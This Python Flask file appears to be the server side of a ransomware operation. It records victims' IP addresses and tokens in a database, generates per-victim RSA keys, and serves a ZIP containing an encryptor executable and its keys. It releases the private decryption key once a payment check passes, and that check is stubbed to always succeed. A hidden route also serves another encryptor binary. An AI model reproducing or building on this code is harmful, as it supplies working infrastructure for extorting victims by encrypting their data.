#!/usr/bin/env python3
import string
from flask import Flask, request, send_file, jsonify
import random
import sqlite3
import os
from rsagen import RSAKeyGenerator
from zipzipper import ZipArchiver

# Create the Flask application
app = Flask(__name__)

# Path to the database
db_url = "$HOME/RansomUtils/db_ransom.db"

# Create instances for RSA key generation and ZIP compression
RSA_gen = RSAKeyGenerator()
zipzipper = ZipArchiver()

# Route to download a file
@app.route("/get", methods=["POST"])
def download_file():
    # Retrieve the file ID from the request parameters
    id = request.args.get("id")
    
    # Retrieve the JSON data from the request
    data = request.get_json()
    requester_token = data["token"]
    
    # Verify the validity of the token
    if check_token(requester_token):
        if id == '201':
            # Paths to the files to include in the ZIP archive
            payload_rans = "$HOME/RansomUtils/crypter.exe"
            pub_key = "$HOME/serveur/" + requester_token + "_public_key.txt"
            AESKey = createAES(requester_token)
            
            # Create a ZIP archive containing the files
            zip = "file.zip"
            zipzipper.create_zip([payload_rans, pub_key, AESKey], zip)
            
            # Remove temporary files
            flush()
            
            # Send the ZIP archive as an attachment
            return send_file(zip, as_attachment=True)
        elif id == '202':
            # Delete the token after use
            delete_token(requester_token)
            
            # Verify the transaction
            if valid_transaction():
                file = "$HOME/RansomUtils/keys/" + requester_token + "_private_key.txt"
                
                # Send the private key file as an attachment
                return send_file(file, as_attachment=True)
        else:
            return 'not ok', 445
    else:
        return 'not ok', 444

# Route to sync and obtain a token
@app.route("/sync", methods=["POST"])
def sync():
    # Retrieve the client's IP address
    ip = request.environ.get('X-Forwarded-For', request.remote_addr)
    
    # Create a 16-character token
    token = create_token(16)
    
    # Insert the token and IP address into the database
    insert_values(token, ip)
    
    # Paths to the private and public keys
    prv_key_path = "$HOME/RansomUtils/keys/" + token + "_private_key.txt"
    pub_key_path = "$HOMEserveur/" + token + "_public_key.txt"
    
    # Generate RSA keys
    RSA_gen.generate_keys(prv_key_path, pub_key_path)
    
    # JSON response containing the token
    response = {'token': token}
    return jsonify(response)

# Test route to send a specific file
@app.route("/EFGEJHGEV2311", methods=["GET"])
def test():
    file = "$HOME/RansomUtils/RSA-Crypter.exe"
    return send_file(file, as_attachment=True)

# Function to remove temporary files in the server directory
def flush():
    os.chdir("/home/razartx/serveur")
    files = os.listdir(os.getcwd())
    for file in files:
        if file.endswith(".txt"):
            os.remove(os.path.join(os.getcwd(), file))

# Function to create an AES key and save it to a file
def createAES(id):
    key = create_token(32)
    path = "$HOME/serveur/" + id + "_AES.txt"
    with open(path, "w") as file:
        file.write(key)
    return path

# Function to validate a transaction (always true in this example)
def valid_transaction():
    return True

# Function to create a random token of n hexadecimal characters
def create_token(n):
    char_hex = string.hexdigits
    token = ''.join(random.choice(char_hex) for _ in range(n))
    return token

# Function to insert the token and IP values into the database
def insert_values(token, ip):
    db = sqlite3.connect(db_url)
    cursor = db.cursor()
    cursor.execute("INSERT INTO token_ip VALUES (?, ?)", (token, ip))
    db.commit()
    db.close()

# Function to check if a token exists in the database
def check_token(token):
    conn = sqlite3.connect(db_url)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM token_ip WHERE token = ?", (token,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

# Function to delete a token from the database
def delete_token(token):
    conn = sqlite3.connect(db_url)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM token_ip WHERE token = ?", (token,))
    conn.commit()
    conn.close()

# Main entry point of the application
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
